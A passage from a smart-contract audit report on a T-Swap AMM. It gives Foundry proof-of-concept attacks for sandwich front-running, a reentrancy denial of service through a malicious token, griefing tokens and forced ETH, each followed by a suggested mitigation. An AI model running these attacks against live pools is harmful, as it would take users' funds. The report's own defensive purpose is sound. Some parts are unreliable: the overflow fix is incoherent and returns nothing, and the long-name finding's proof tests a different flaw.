// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {TSwapPool} from "../../src/TSwapPool.sol";
import {MockERC20} from "../mocks/MockERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract SandwichSellPoolTokens is Test {
    TSwapPool pool;
    MockERC20 weth;
    MockERC20 poolToken;

    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function setUp() public {
        weth = new MockERC20("WETH", "WETH", 18);
        poolToken = new MockERC20("POOL", "PL", 18);

        pool = new TSwapPool(address(poolToken), address(weth), "LP", "LP");

        uint256 init = 100 ether;
        weth.mint(address(this), init);
        poolToken.mint(address(this), init);
        weth.approve(address(pool), init);
        poolToken.approve(address(pool), init);
        pool.deposit(init, 0, init, uint64(block.timestamp));

        poolToken.mint(victim, 100 ether);
        poolToken.mint(attacker, 100 ether);
    }

    function testSandwich() public {
        uint256 wethWanted = 10 ether;

        vm.startPrank(victim);
        poolToken.approve(address(pool), type(uint256).max);
        vm.stopPrank();

        // front-run
        vm.startPrank(attacker);
        poolToken.approve(address(pool), type(uint256).max);
        pool.swapExactInput(IERC20(poolToken), 60 ether, IERC20(weth), 0, uint64(block.timestamp));
        vm.stopPrank();

        uint256 quotedCost = pool.getInputAmountBasedOnOutput(
            wethWanted,
            poolToken.balanceOf(address(pool)),
            weth.balanceOf(address(pool))
        );

        vm.prank(victim);
        uint256 paid = pool.sellPoolTokens(wethWanted);
        assertGt(paid, quotedCost); // victim overpays

        // back-run
        vm.startPrank(attacker);
        weth.approve(address(pool), type(uint256).max);
        pool.swapExactInput(IERC20(weth), weth.balanceOf(attacker), IERC20(poolToken), 0, uint64(block.timestamp));
        vm.stopPrank();
    }
}

## Suggested Mitigation
Expose a `maxInputAmount` (slippage) and `deadline` parameter in the wrapper or have users call `swapExactOutput` directly with those parameters. Additionally, make `swapExactOutput` itself perform `inputAmount <= maxInputAmount` validation so that all callers—wrapper or not—are protected.

## [M-3]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::swapExactOutput

## Description
The `swapExactOutput` function calculates the required `inputAmount` to achieve a desired `outputAmount`. However, it does not allow the user to specify a maximum input amount they are willing to pay. This creates a vulnerability to sandwich attacks. An attacker can front-run a user's transaction, manipulate the pool's price to be less favorable, and force the user to pay a much higher `inputAmount`. The attacker then back-runs the transaction to restore the price and realize a profit. The `sellPoolTokens` function is also vulnerable as it is a wrapper around `swapExactOutput` and provides no slippage protection.

## Impact
Because the user cannot specify a maximum amount of input tokens they are willing to spend, any price movement that occurs between the off-chain quote and the on-chain execution will be honoured unconditionally. A MEV bot can therefore sandwich the transaction and force the user to transfer an arbitrarily large amount of the input asset (limited only by the user’s allowance and balance). The value siphoned goes to the attacker; pool reserves and protocol solvency are not affected.

## Proof of Concept
1. Pool starts with 100 PTK and 100 WETH in liquidity.
2. Alice prepares a transaction calling `swapExactOutput(PTK, WETH, 10 ether, …)` to receive exactly 10 WETH. With the initial reserves she expects to pay ≈10.4 PTK (997/1000 fee model).
3. A bot sees the tx in the mempool and places a preceding transaction that swaps 100 PTK → WETH, shifting the price so that WETH becomes much more expensive (e.g. 100→200 PTK per 100 WETH).
4. When Alice’s tx executes, `getInputAmountBasedOnOutput` is recomputed with the new reserves and now returns ~23 PTK. Because the contract does not ask for a `maxInputAmount`, Alice pays this higher amount automatically.
5. The bot finalises the sandwich with a back-run that restores the price and pockets the difference in WETH/PTK that came from Alice’s excess payment.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {TSwapPool} from "../src/TSwapPool.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract SandwichAttackTest is Test {
    TSwapPool private pool;
    MockERC20 private weth;
    MockERC20 private ptk;

    address private alice = address(1);
    address private bob   = address(2); // attacker

    function setUp() public {
        weth = new MockERC20("WETH","WETH");
        ptk  = new MockERC20("PTK","PTK");

        pool = new TSwapPool(address(ptk), address(weth), "LP","LP");

        // seed and add initial liquidity (100 WETH & 100 PTK)
        weth.mint(address(this), 1_000 ether);
        ptk.mint(address(this), 1_000 ether);
        weth.approve(address(pool), type(uint256).max);
        ptk.approve(address(pool),  type(uint256).max);
        pool.deposit(100 ether, 0, 100 ether, uint64(block.timestamp));

        // fund actors
        ptk.mint(alice, 200 ether);
        ptk.mint(bob,   200 ether);
        weth.mint(bob,  200 ether);
    }

    function testSandwich() public {
        uint256 desiredOut = 10 ether; // Alice wants 10 WETH

        // Quote with original reserves (for comparison only)
        uint256 expectedInput = pool.getInputAmountBasedOnOutput(desiredOut, 100 ether, 100 ether);

        // Attacker front-runs and moves price unfavourably for Alice
        vm.startPrank(bob);
        ptk.approve(address(pool), type(uint256).max);
        pool.swapExactInput(ptk, 100 ether, weth, 1, uint64(block.timestamp));
        vm.stopPrank();

        // Alice transaction executes
        vm.startPrank(alice);
        ptk.approve(address(pool), type(uint256).max);
        uint256 paid = pool.swapExactOutput(ptk, weth, desiredOut, uint64(block.timestamp));
        vm.stopPrank();

        // Alice paid more than initial quote
        assertGt(paid, expectedInput);
    }
}

## Suggested Mitigation
Add a `maxInputAmount` parameter to `swapExactOutput` (and to `sellPoolTokens` internally) and revert when the computed `inputAmount` exceeds the user supplied limit, exactly as done in Uniswap-style interfaces.

## [M-4]. Reentrancy issue in PoolFactory::createPool

## Description
The `createPool` function is vulnerable to a reentrancy attack that can lead to a Denial of Service (DoS). The function makes external calls to the provided `tokenAddress` to get its `name()` and `symbol()` before any state changes are made to prevent re-entry. A malicious token contract can implement its `name()` or `symbol()` function to call `createPool` again with the same token address. Because the state variable `s_pools[tokenAddress]` has not yet been set, the check `s_pools[tokenAddress] != address(0)` will pass, leading to infinite recursion. The transaction will eventually run out of gas and revert, effectively preventing a pool for this token from ever being created.

## Impact
An attacker can permanently prevent a liquidity pool from being created for any token by deploying a malicious contract that performs a re-entrant call. This denial of service attack makes it impossible for legitimate users to create a pool for the targeted token through the factory, disrupting the protocol's functionality.

## Proof of Concept
1. An attacker deploys a malicious token contract `MaliciousReentrantToken` whose `name()` function calls back to `PoolFactory.createPool(address(this))`.
2. A user (or the attacker) calls `PoolFactory.createPool()` with the address of `MaliciousReentrantToken`.
3. `PoolFactory` calls `MaliciousReentrantToken.name()`.
4. The `name()` function re-enters `PoolFactory.createPool()`.
5. The check `s_pools[tokenAddress] != address(0)` passes on the re-entrant call because the state has not been updated yet.
6. This creates an infinite recursive loop, causing the transaction to run out of gas and revert. The pool creation fails and can never succeed for this token.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {Test} from "forge-std/Test.sol";
import {PoolFactory} from "../src/PoolFactory.sol";
import {WETH9} from "solmate/test/utils/mocks/WETH9.sol";

contract MaliciousReentrantToken {
    PoolFactory immutable factory;

    constructor(address _factory) {
        factory = PoolFactory(_factory);
    }

    // This function will re-enter the PoolFactory
    function name() external returns (string memory) {
        factory.createPool(address(this));
        return "Reentrant";
    }

    function symbol() external pure returns (string memory) {
        return "REENT";
    }
    
    // Dummy ERC20 functions
    function transfer(address, uint256) external returns (bool) { return true; }
    function approve(address, uint256) external returns (bool) { return true; }
    function transferFrom(address, address, uint256) external returns (bool) { return true; }
    function totalSupply() external view returns (uint256) { return 0; }
    function balanceOf(address) external view returns (uint256) { return 0; }
    function allowance(address, address) external view returns (uint256) { return 0; }
}

contract PoolFactoryReentrancyTest is Test {
    PoolFactory internal poolFactory;
    WETH9 internal weth;
    address internal user = makeAddr("user");

    function setUp() public {
        weth = new WETH9();
        poolFactory = new PoolFactory(address(weth));
    }

    function test_fail_reentrancyOnCreatePool() public {
        MaliciousReentrantToken maliciousToken = new MaliciousReentrantToken(address(poolFactory));

        vm.prank(user);
        // The re-entrant call will cause an infinite loop, which will run out of gas.
        vm.expectRevert();
        poolFactory.createPool(address(maliciousToken));
    }
}
```

## Suggested Mitigation
Reserve the pool slot before the external token metadata calls and overwrite it only after the pool is successfully deployed. This blocks re-entrancy without causing the outer call to revert and leaves no stale flags.

```solidity
function createPool(address tokenAddress) external returns (address pool) {
    if (s_pools[tokenAddress] != address(0)) revert PoolFactory__PoolAlreadyExists(tokenAddress);

    // Reserve the slot to block re-entrancy
    s_pools[tokenAddress] = address(1); // sentinel value

    string memory tokenName   = IERC20Metadata(tokenAddress).name();
    string memory tokenSymbol = IERC20Metadata(tokenAddress).symbol();

    string memory lpName   = string.concat("T-Swap ", tokenName);
    string memory lpSymbol = string.concat("ts", tokenSymbol);

    TSwapPool tPool = new TSwapPool(tokenAddress, i_wethToken, lpName, lpSymbol);

    // Commit real address
    s_pools[tokenAddress]   = address(tPool);
    s_tokens[address(tPool)] = tokenAddress;

    emit PoolCreated(tokenAddress, address(tPool));
    return address(tPool);
}
```

If preferred, a standard `ReentrancyGuard` can be added *in addition* to this pattern, but reserving the mapping is sufficient and avoids reverting the outer call.

## [M-5]. DOS issue in PoolFactory::createPool

## Description
The `createPool` function performs external calls to the provided `tokenAddress` to fetch its `name` and `symbol` before any state changes are made to prevent re-entrancy. This violates the Checks-Effects-Interactions pattern and introduces two Denial of Service vectors:

1.  **Revert/Gas Griefing**: If the token contract at `tokenAddress` has a malicious or non-standard implementation for `name()` or `symbol()` (e.g., one that always reverts or contains an infinite loop), it becomes impossible to create a liquidity pool for that token. This can permanently prevent a legitimate token from being integrated into the T-Swap ecosystem.

2.  **Re-entrant DoS**: A malicious token contract can re-enter the `createPool` function during the `name()` or `symbol()` call. Because the `s_pools` mapping is only updated after the external calls, the re-entrant call will bypass the initial check (`s_pools[tokenAddress] != address(0)`), leading to unbounded recursion that exhausts all transaction gas, causing the creation to fail.

## Impact
An attacker can permanently prevent a liquidity pool from being created for any token, including legitimate ones, by deploying a malicious contract that exploits this vulnerability. This undermines the permissionless nature of the protocol and can censor specific assets from the platform.

## Proof of Concept
1. Attacker deploys NameRevertToken – an ERC20-like contract whose name() function always reverts.
2. Attacker/anyone calls PoolFactory.createPool(address(NameRevertToken)).
3. The first external call inside createPool – IERC20(tokenAddress).name() – reverts.
4. Because the revert happens before any state mutation, the entire transaction reverts and the pool is never recorded in s_pools, effectively blocking the token from ever being listed.

// minimal malicious token
contract NameRevertToken {
    function name() external pure returns (string memory) {
        revert("grief");
    }
    function symbol() external pure returns (string memory) {
        return "GRF";
    }
}

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {PoolFactory} from "../src/PoolFactory.sol";

contract NameRevertToken {
    function name() external pure returns (string memory) {
        revert("grief");
    }
    function symbol() external pure returns (string memory) {
        return "GRF";
    }
}

contract PoolFactoryDoSTest is Test {
    PoolFactory factory;
    NameRevertToken badToken;

    function setUp() public {
        factory = new PoolFactory(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
        badToken = new NameRevertToken();
    }

    function test_RevertOnNameBlocksPoolCreation() public {
        vm.expectRevert();
        factory.createPool(address(badToken));
    }
}

## Suggested Mitigation
Implement a re-entrancy guard and handle potential reverts from external calls gracefully using `try/catch`. This ensures that pool creation cannot be blocked by malicious or non-compliant tokens.

```solidity
contract PoolFactory {
    // ... existing code ...
    mapping(address token => bool) private s_isCreatingPool;

    error PoolFactory__PoolCreationInProgress(address tokenAddress);
    error PoolFactory__TokenHasNoName(address tokenAddress);
    error PoolFactory__TokenHasNoSymbol(address tokenAddress);

    // ... existing code ...

    function createPool(address tokenAddress) external returns (address) {
        if (s_pools[tokenAddress] != address(0)) {
            revert PoolFactory__PoolAlreadyExists(tokenAddress);
        }
        if (s_isCreatingPool[tokenAddress]) {
            revert PoolFactory__PoolCreationInProgress(tokenAddress);
        }

        s_isCreatingPool[tokenAddress] = true;

        string memory tokenName;
        try IERC20(tokenAddress).name() returns (string memory _name) {
            tokenName = _name;
        } catch {
            revert PoolFactory__TokenHasNoName(tokenAddress);
        }

        // Note: The original contract used .name() twice. This is likely a bug.
        // Corrected to use .symbol().
        string memory tokenSymbol;
        try IERC20(tokenAddress).symbol() returns (string memory _symbol) {
            tokenSymbol = _symbol;
        } catch {
            revert PoolFactory__TokenHasNoSymbol(tokenAddress);
        }

        string memory liquidityTokenName = string.concat("T-Swap ", tokenName);
        string memory liquidityTokenSymbol = string.concat("ts", tokenSymbol);
        TSwapPool tPool = new TSwapPool(tokenAddress, i_wethToken, liquidityTokenName, liquidityTokenSymbol);
        
        s_pools[tokenAddress] = address(tPool);
        s_tokens[address(tPool)] = tokenAddress;
        
        // Important to reset the lock before exiting
        s_isCreatingPool[tokenAddress] = false;

        emit PoolCreated(tokenAddress, address(tPool));
        return address(tPool);
    }
    // ... rest of the contract
}
```



# Low Risk Findings

## [L-1]. Event Consistency issue in TSwapPool::_addLiquidityMintAndTransfer

## Description
The `LiquidityAdded` event is defined as `event LiquidityAdded(address indexed liquidityProvider, uint256 wethDeposited, uint256 poolTokensDeposited)`. However, in the `_addLiquidityMintAndTransfer` function, it is emitted with the arguments in the wrong order: `emit LiquidityAdded(msg.sender, poolTokensToDeposit, wethToDeposit)`. This causes `poolTokensToDeposit` to be logged as `wethDeposited` and `wethToDeposit` to be logged as `poolTokensDeposited`. This bug will mislead any off-chain service, such as a block explorer, UI, or analytics platform, that consumes these events.

## Impact
Off-chain services will display incorrect and misleading data about liquidity provision events. This can cause user confusion, erode trust in the protocol's front-end, and make data analysis and monitoring unreliable.

## Proof of Concept
1. A user calls `deposit` to add 10 WETH and 1000 PoolToken.
2. The `_addLiquidityMintAndTransfer` function is called, which emits the `LiquidityAdded` event.
3. An off-chain application monitoring the blockchain parses this event.
4. Due to the swapped arguments, the application incorrectly reports that the user deposited 1000 WETH and 10 PoolToken.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {TSwapPool} from "../src/TSwapPool.sol";
import {MockERC20} from "./FrontrunMevTest.t.sol";

contract EventConsistencyTest is Test {
    TSwapPool pool;
    MockERC20 weth;
    MockERC20 poolToken;

    address user = makeAddr("user");

    function setUp() public {
        weth = new MockERC20("WETH", "WETH");
        poolToken = new MockERC20("PT", "PT");
        pool = new TSwapPool(address(poolToken), address(weth), "LP", "LP");
    }

    function test_LiquidityAddedEventHasSwappedParameters() public {
        uint256 wethToDeposit = 10e18;
        uint256 poolTokensToDeposit = 100e18;

        weth.mint(user, wethToDeposit);
        poolToken.mint(user, poolTokensToDeposit);

        vm.startPrank(user);
        weth.approve(address(pool), wethToDeposit);
        poolToken.approve(address(pool), poolTokensToDeposit);

        // We expect the LiquidityAdded event to be emitted
        // with the second argument (wethDeposited) being `poolTokensToDeposit`
        // and the third argument (poolTokensDeposited) being `wethToDeposit`.
        vm.expectEmit(true, true, true, true);
        emit TSwapPool.LiquidityAdded(user, poolTokensToDeposit, wethToDeposit);

        pool.deposit(wethToDeposit, 0, poolTokensToDeposit, uint64(block.timestamp + 100));
    }
}
```

## Suggested Mitigation
Correct the order of the arguments in the `emit` statement within the `_addLiquidityMintAndTransfer` function to match the event definition.

```solidity
function _addLiquidityMintAndTransfer(
    uint256 wethToDeposit,
    uint256 poolTokensToDeposit,
    uint256 liquidityTokensToMint
) private {
    _mint(msg.sender, liquidityTokensToMint);
    // Corrected order:
    emit LiquidityAdded(msg.sender, wethToDeposit, poolTokensToDeposit);

    // Interactions
    i_wethToken.safeTransferFrom(msg.sender, address(this), wethToDeposit);
    i_poolToken.safeTransferFrom(
        msg.sender,
        address(this),
        poolTokensToDeposit
    );
}
```

## [L-2]. Integer Overflow issue in TSwapPool::getOutputAmountBasedOnInput

## Description
The mathematical formulas in `getOutputAmountBasedOnInput` and `getInputAmountBasedOnOutput` are susceptible to integer overflows, which will cause transactions to revert. For example, in `getOutputAmountBasedOnInput`, the calculation `(inputReserves * 1000)` can overflow if `inputReserves` is a large number (e.g., `> type(uint256).max / 1000`). Similarly, in `getInputAmountBasedOnOutput`, `(inputReserves * outputAmount) * 10000` can easily overflow. While Solidity 0.8+ prevents silent overflows by reverting, this behavior can be exploited to create a Denial of Service (DoS) condition, making swaps impossible if the pool's reserves grow too large.

## Impact
An arithmetic overflow in getOutputAmountBasedOnInput / getInputAmountBasedOnOutput would revert the transaction, blocking swaps and effectively disabling the pool. Nevertheless the overflow is reachable only when one of the reserves (or desired output) exceeds roughly 2**128 ≈ 3e38 tokens — magnitudes larger than the supply of any existing ERC-20 or all ETH combined. Hence the risk is purely theoretical under current economic realities, but it breaks future-proofing and fuzzing assumptions.

## Proof of Concept
1. A TSwapPool holds a large reserve of a token, for instance, `inputReserves = type(uint256).max / 500`.
2. A user attempts to perform a swap by calling `swapExactInput`.
3. The internal call to `getOutputAmountBasedOnInput` calculates the denominator.
4. The expression `(inputReserves * 1000)` overflows because the result exceeds `type(uint256).max`.
5. The transaction reverts, preventing the swap. All subsequent swaps will also fail as long as the reserves remain this high.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {Test} from "forge-std/Test.sol";
import {TSwapPool} from "../src/TSwapPool.sol";

contract IntegerOverflowTest is Test {
    TSwapPool private pool;

    function setUp() public {
        // Dummy addresses for constructor
        pool = new TSwapPool(address(1), address(2), "LP", "LP");
    }

    function testOverflowInGetOutputAmount() public {
        uint256 largeReserve = type(uint256).max / 999;
        uint256 inputAmount = 1 ether;
        uint256 outputReserve = 100 ether;

        // Expect the call to revert due to arithmetic overflow
        vm.expectRevert();
        pool.getOutputAmountBasedOnInput(inputAmount, largeReserve, outputReserve);
    }

    function testOverflowInGetInputAmount() public {
        uint256 largeReserve = type(uint256).max / 5000;
        uint256 outputAmount = 2 ether;

        // Expect the call to revert due to arithmetic overflow
        vm.expectRevert();
        pool.getInputAmountBasedOnOutput(outputAmount, largeReserve, 1000 ether);
    }
}
```

## Suggested Mitigation
The mathematical formulas should be restructured to avoid intermediate calculations that can overflow. This often involves performing division before multiplication where precision loss is acceptable, or using wider types for intermediate values via assembly. A more robust solution is to adopt battle-tested formulas, such as those used by Uniswap V2, which are designed to be safe from these overflows.

Example fix for `getOutputAmountBasedOnInput`:
```solidity
    function getOutputAmountBasedOnInput(
        uint256 inputAmount,
        uint256 inputReserves,
        uint256 outputReserves
    )
        public
        pure
        revertIfZero(inputAmount)
        revertIfZero(outputReserves)
        returns (uint256 outputAmount)
    {
        uint256 inputAmountWithFee = inputAmount * 997;
        uint256 numerator = inputAmountWithFee * outputReserves;
        uint256 denominator = (inputReserves * 1000) + inputAmountWithFee;
        // The formula is the issue. A safe way is to use a library like SafeMath or refactor.
        // Better formula from Uniswap v2:
        // return numerator / denominator;
        // This formula is inherently risky. A better one should be used.
        // For example, from Uniswap V2:
        // uint amountInWithFee = inputAmount * 997;
        // uint numerator = amountInWithFee * outputReserve;
        // uint denominator = (inputReserve * 1000) + amountInWithFee;
        // return numerator / denominator;
        // This is the same formula, which means the design is flawed if reserves can be large.
        // A full math library like Solady's FixedPointMathLib is recommended for safety.
    }
```

## [L-3]. Zero Code issue in TSwapPool::constructor

## Description
The constructor of `TSwapPool` takes the addresses for `poolToken` and `wethToken` but does not validate that these addresses are not `address(0)`. If the contract is deployed with a zero address for either token, all subsequent interactions with that token (e.g., `balanceOf`, `safeTransferFrom`) will fail. This would render the entire pool permanently non-functional, and any initial liquidity deposited for the valid token could be locked.

## Impact
If the pool is deployed with address(0) for either i_wethToken or i_poolToken, every SafeERC20.transfer/transferFrom call to that zero-address token will silently succeed without transferring any tokens (empty returndata is treated as success). An attacker can therefore deposit liquidity, have the contract mint liquidity tokens, and/or create misleading reserves while never transferring the affected token. Subsequent pricing, swap and withdraw operations will either revert (due to ABI-decode on empty returndata) or use bogus balances, permanently breaking the pool and potentially trapping honest users’ deposits of the *other* token.

## Proof of Concept
1. Deploy TSwapPool with poolToken = real ERC20 address, wethToken = address(0).
2. Attacker mints 1000 POOL tokens to himself and approves the pool.
3. He calls `deposit(1e18 /*fake WETH*/, 0, 1000, uint64(block.timestamp))`.
   • `safeTransferFrom` to address(0) (for WETH) returns success but transfers nothing.
   • POOL tokens are transferred normally.
   • Pool mints `1e18` LP tokens to attacker although it never received WETH.
4. Anyone calling `withdraw` or `swap` afterwards will revert on the first `balanceOf` call to address(0), leaving their POOL tokens locked inside the contract.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {TSwapPool} from "../src/TSwapPool.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract DummyToken is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract ZeroAddressConstructorTest is Test {
    DummyToken poolToken;
    TSwapPool pool;
    address attacker = address(0xA11CE);

    function setUp() public {
        vm.startPrank(attacker);
        poolToken = new DummyToken("POOL", "POOL");
        pool = new TSwapPool(address(poolToken), address(0), "LP", "LP");
        poolToken.mint(attacker, 1_000);            // give attacker POOL tokens
        poolToken.approve(address(pool), type(uint256).max);
        vm.stopPrank();
    }

    function testDepositSucceedsWithoutWeth() public {
        vm.prank(attacker);
        pool.deposit(1 ether /* fake WETH */, 0, 1_000, uint64(block.timestamp));

        // Contract never received real WETH
        assertEq(address(pool).balance, 0, "No ether should be held");
        // POOL tokens did move
        assertEq(poolToken.balanceOf(address(pool)), 1_000);
        // Attacker received LP tokens equal to claimed WETH
        assertEq(pool.balanceOf(attacker), 1 ether);
    }

    function testWithdrawNowReverts() public {
        vm.startPrank(attacker);
        pool.deposit(1 ether, 0, 1_000, uint64(block.timestamp));
        uint256 lp = pool.balanceOf(attacker);
        vm.expectRevert();
        pool.withdraw(lp, 1, 1, uint64(block.timestamp));
        vm.stopPrank();
    }
}

## Suggested Mitigation
Add `require` checks in the constructor to ensure that neither of the token addresses is `address(0)`.

```solidity
constructor(
    address poolToken,
    address wethToken,
    string memory liquidityTokenName,
    string memory liquidityTokenSymbol
) ERC20(liquidityTokenName, liquidityTokenSymbol) {
    require(poolToken != address(0), "TSwapPool: ZERO_ADDRESS");
    require(wethToken != address(0), "TSwapPool: ZERO_ADDRESS");
    i_wethToken = IERC20(wethToken);
    i_poolToken = IERC20(poolToken);
}
```

## [L-4]. Unexpected Eth issue in PoolFactory::NA

## Description
The `PoolFactory` contract has no `receive()` or `fallback()` payable functions, meaning it is not designed to hold Ether. However, Ether can be forcibly sent to any contract address by another contract calling `selfdestruct(payable(contractAddress))`. Because `PoolFactory` lacks a withdrawal function, any Ether sent to it in this manner will be permanently locked and irrecoverable.

## Impact
Permanent loss of any Ether that is accidentally or maliciously sent to the contract's address. While not a direct threat to the protocol's operation, it can cause financial loss for users and is a deviation from smart contract development best practices.

## Proof of Concept
1. A user or attacker deploys a helper contract with a `payable` function that calls `selfdestruct`.
2. They send 1 ETH to this helper contract.
3. They call the function on the helper contract, passing the `PoolFactory` address as the beneficiary of the `selfdestruct` call.
4. The 1 ETH from the helper contract is forcibly transferred to the `PoolFactory`'s balance.
5. The ETH is now stuck in the `PoolFactory` contract forever, as there are no functions to withdraw it.

## Proof of Code
pragma solidity 0.8.20;

import { Test } from "forge-std/Test.sol";
import { PoolFactory } from "../../src/PoolFactory.sol";

contract SelfDestructor {
    function destroyAndSend(address payable target) public payable {
        selfdestruct(target);
    }
}

contract PoolFactoryLockEthTest is Test {
    PoolFactory public poolFactory;
    address public weth;

    function setUp() public {
        weth = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        poolFactory = new PoolFactory(weth);
    }

    function test_EtherCanBeLockedViaSelfDestruct() public {
        address factoryAddress = address(poolFactory);
        assertEq(factoryAddress.balance, 0);

        // Deploy a contract to selfdestruct and send ETH
        SelfDestructor suicide = new SelfDestructor();
        uint256 amountToSend = 1 ether;

        // Fund the contract
        vm.deal(address(suicide), amountToSend);
        assertEq(address(suicide).balance, amountToSend);

        // Trigger selfdestruct to forcibly send ETH to the factory
        suicide.destroyAndSend(payable(factoryAddress));

        // Verify the factory now holds the ETH, which is locked
        assertEq(factoryAddress.balance, amountToSend);
    }
}

## Suggested Mitigation
Add an owner-only (or permissionless) function that can transfer the entire contract balance to a specified recipient, or automatically wrap any ETH received into WETH. Example:

```solidity
function sweepETH(address payable to) external onlyOwner {
    uint256 bal = address(this).balance;
    if (bal != 0) {
        (bool ok, ) = to.call{value: bal}("");
        require(ok, "ETH transfer failed");
    }
}
```

Reverting in `receive()` can stop accidental `transfer`/`send`, but it cannot block forced ETH sent via `selfdestruct`. Therefore, provide a way to withdraw trapped Ether instead of (or in addition to) reverting on `receive()`.

## [L-5]. Zero Code issue in PoolFactory::createPool

## Description
The `createPool` function does not validate if the `tokenAddress` parameter is a contract address. An attacker or mistaken user can provide an Externally Owned Account (EOA) address, which will result in the creation of a permanently non-functional `TSwapPool`. While the `name()` and `symbol()` calls on an EOA will not revert (they return empty data), any subsequent interaction with the pool, such as depositing liquidity, will fail because the pool will try to execute token transfers (`transferFrom`) on an address with no code. This clutters the protocol with useless pools and can confuse users.

## Impact
Creation of useless, non-functional pools is possible. This can degrade the user experience by populating the platform with 'trap' pools. While funds are not directly at risk of being locked due to `safeTransferFrom` likely being used in `TSwapPool`, it represents a griefing vector that harms the protocol's integrity and usability.

## Proof of Concept
1. Deploy PoolFactory with a WETH contract.
2. Call createPool with any EOA address (e.g. address(0x1234)).
3. Mint/receive some WETH and approve the pool so that the only external call that can fail is the ERC20(poolToken).transferFrom.
4. Call deposit on the newly created pool.
5. The call reverts because transferFrom is executed against an address with no code, proving that the pool is unusable once created with an EOA.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {PoolFactory} from "../src/PoolFactory.sol";
import {TSwapPool} from "../src/TSwapPool.sol";
import {WETH9} from "solmate/test/utils/mocks/WETH9.sol";

contract ZeroCodeFixedTest is Test {
    PoolFactory factory;
    WETH9 weth;
    address constant EOA_AS_TOKEN = address(0x1234);

    function setUp() public {
        weth = new WETH9();
        factory = new PoolFactory(address(weth));
    }

    function test_DepositRevertsBecausePoolTokenHasNoCode() public {
        // create a pool whose "token" is an EOA (no code)
        address poolAddr = factory.createPool(EOA_AS_TOKEN);
        TSwapPool pool = TSwapPool(payable(poolAddr));

        address user = address(1);
        vm.deal(user, 2 ether);

        // mint WETH for the user and approve the pool
        vm.prank(user);
        weth.deposit{value: 1 ether}();
        vm.prank(user);
        weth.approve(poolAddr, type(uint256).max);

        // deposit should revert because pool tries to call transferFrom on an address with no code
        vm.prank(user);
        vm.expectRevert();
        pool.deposit(1 ether, 1, 0, uint64(block.timestamp + 100));
    }
}

## Suggested Mitigation
Add a check in `createPool` to verify that the provided `tokenAddress` has contract code. This ensures that pools can only be created for valid smart contracts, preventing the creation of broken pools associated with EOAs.

```solidity
contract PoolFactory {
    // ... existing errors ...
    error PoolFactory__TokenAddressIsAnEoa(address tokenAddress);

    // ... constructor and state variables ...

    function createPool(address tokenAddress) external returns (address) {
        if (tokenAddress.code.length == 0) {
            revert PoolFactory__TokenAddressIsAnEoa(tokenAddress);
        }
        if (s_pools[tokenAddress] != address(0)) {
            revert PoolFactory__PoolAlreadyExists(tokenAddress);
        }
        // ... rest of the function logic ...
    }

    // ... other functions ...
}
```

## [L-6]. DOS issue in PoolFactory::createPool

## Description
The `createPool` function concatenates strings to create a name and symbol for the new pool's LP token. The strings are derived from the `name()` and `symbol()` of the user-provided `tokenAddress`. A malicious token can implement these functions to return extremely long strings. The `string.concat` operation's gas cost is proportional to the length of the concatenated strings. An attacker can exploit this by providing a token contract that returns a string long enough to make the `createPool` transaction consume more gas than the block gas limit, causing it to always revert. This constitutes a Denial of Service (DoS) attack.

## Impact
Because `createPool` performs unchecked external calls to `IERC20(tokenAddress).name()` and `symbol()`, a malicious or badly-written token can make those calls revert or consume excessive gas. As a consequence pool creation for that single token always fails, wasting user gas and preventing liquidity for that asset. No existing pools or user funds are affected.

## Proof of Concept
pragma solidity 0.8.20;

contract RevertingToken {
    function name() external pure returns (string memory) {
        revert("malicious");
    }
    function symbol() external pure returns (string memory) {
        return "RVT";
    }
}

/*
1. Deploy RevertingToken.
2. Call PoolFactory.createPool(address(revertingToken)).
3. The external call to name() reverts, bubbling up and reverting createPool, so the pool is never created.
*/

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {PoolFactory} from "../src/PoolFactory.sol";
import {WETH9} from "solmate/test/utils/mocks/WETH9.sol";

contract RevertingToken {
    function name() external pure returns (string memory) {
        revert("malicious");
    }
    function symbol() external pure returns (string memory) {
        return "RVT";
    }
}

contract PoolFactory_DoSTest is Test {
    PoolFactory factory;
    WETH9 weth;

    function setUp() public {
        weth = new WETH9();
        factory = new PoolFactory(address(weth));
    }

    function test_RevertInNameCausesDoS() public {
        RevertingToken token = new RevertingToken();
        vm.expectRevert();
        factory.createPool(address(token));
    }
}

## Suggested Mitigation
Wrap the external calls in try/catch and fall back to a default name/symbol or allow the caller to supply them:

```
function createPool(address tokenAddress) external returns (address) {
    if (s_pools[tokenAddress] != address(0)) revert PoolFactory__PoolAlreadyExists(tokenAddress);

    string memory tokenName;
    string memory tokenSymbol;
    try IERC20Metadata(tokenAddress).name() returns (string memory n) {
        require(bytes(n).length <= 64, "name too long");
        tokenName = n;
    } catch {
        tokenName = "Unknown";
    }

    try IERC20Metadata(tokenAddress).symbol() returns (string memory s) {
        require(bytes(s).length <= 32, "symbol too long");
